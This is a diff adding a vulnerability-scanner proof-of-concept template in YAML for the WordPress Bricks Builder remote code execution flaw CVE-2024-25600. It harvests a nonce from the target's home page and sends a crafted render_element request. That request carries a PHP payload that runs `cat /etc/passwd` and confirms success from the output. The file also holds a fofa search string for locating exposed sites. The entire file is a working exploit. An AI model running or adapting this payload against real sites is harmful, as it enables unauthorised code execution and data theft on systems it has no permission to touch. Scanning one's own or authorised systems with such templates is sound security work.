@@ -1,0 +1,30 @@
+id: poc-yaml-wordpress-bricks-builder-rce
+info:
+  name: WordPress Bricks Builder RCE(CVE-2024-25600)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2024-25600
+  finger: Bricks Builder
+  fofa: body="/wp-content/themes/bricks/"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"nonce")
+  output:
+  - regex_match(body,`"nonce":"(?P<nonce>.*?)",`)
+- method: POST
+  path: /wp-json/bricks/v1/render_element
+  headers:
+    Content-Type: application/json
+  data: "{\n  \"postId\": \"1\",\n  \"nonce\": \"{{.nonce}}\",\n  \"element\": {\n\
+    \  \"name\": \"container\",\n  \"settings\": {\n  \"hasLoop\": \"true\",\n  \"\
+    query\": {\n  \"useQueryEditor\": true,\n  \"queryEditor\": \"ob_start();echo\
+    \ `cat /etc/passwd`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);\"\
+    ,\n  \"objectType\": \"post\"\n           }\n              }\n             }\n\
+    }\n"
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(headers,"application/json")
+variables: {}
+transport: http
